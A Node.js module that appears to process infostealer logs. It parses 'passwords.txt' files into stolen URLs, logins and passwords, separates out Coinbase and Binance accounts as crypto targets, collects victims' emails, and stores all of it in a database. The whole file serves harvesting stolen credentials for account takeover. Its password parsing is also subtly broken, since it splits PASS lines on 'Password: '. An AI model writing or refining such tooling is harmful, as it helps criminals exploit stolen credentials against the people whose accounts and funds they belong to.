import config from "../config/index.js";

import { readFile, rmdir } from "node:fs/promises";
import AdmZip from "adm-zip";

import cryptoController from "../controllers/cryptoController.js";

export async function exactAndParseFile(directory) {
  console.log(directory);
  try {
    //! read content
    let content = await readFile(directory + "/passwords.txt", {
      encoding: "utf8",
    });

    // Split data into lines
    const lines = content.split(/\r?\n/);

    // Regex to identify email and filter domains
    const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/;
    const domainsToMatch = ["coinbase.com", "binance.com"];

    // Object to hold extracted credentials
    const credentials = [];
    const domainMatchs = [];
    const emails = [];

    // Temporary object to store current credentials
    let currentCredentials = {};
    await Promise.all(
      lines.map(async (line) => {
        if (line.startsWith("URL:")) {
          const url = line.split("URL: ")[1].trim();
          const domainMatches = domainsToMatch.some((domain) =>
            url.includes(domain)
          );
          if (domainMatches) {
            currentCredentials.url = url;
            currentCredentials.domainMatch = true;
          } else {
            currentCredentials.url = line.slice(5);
            currentCredentials.domainMatch = false;
          }
        } else if (line.startsWith("USER:")) {
          const loginMatch = line.match(emailRegex);
          currentCredentials.login = loginMatch ? loginMatch[0] : line.slice(7);

          //! check duplicate and push gmail
          if (loginMatch) {
            let check_duplicate_email = emails.filter(
              (item) => item == loginMatch[0]
            ).length;
            if (check_duplicate_email == 0) {
              emails.push(loginMatch[0]);
            }
          }
        } else if (line.startsWith("PASS:")) {
          currentCredentials.password = line.split("Password: ")[1].trim();
          // Only add to array if we have both login and password
          if (currentCredentials.login) {
            if (currentCredentials.domainMatch) {
              domainMatchs.push(currentCredentials);
            } else {
              credentials.push(currentCredentials);
            }
          }
          currentCredentials = {};
        }
      })
    );
    console.log({ credentials, domainMatchs, emails });
    return { credentials, domainMatchs, emails };
  } catch (err) {
    console.log("error occures in passwords.txt read", err);
    return { credentials: [], domainMatchs: [], emails: [] };
  }
}

export async function save_data(data) {
  let credentials = data.credentials;
  let domainMatchs = data.domainMatchs;
  let emails = data.emails;

  await Promise.all(
    credentials.map(async (item) => {
      return await cryptoController.createDomain(item);
    })
  );

  await Promise.all(
    domainMatchs.map(async (item) => {
      return await cryptoController.createCrypto(item);
    })
  );

  await Promise.all(
    emails.map(async (item) => {
      return await cryptoController.createEmail({ email: item });
    })
  );

  return true;
}
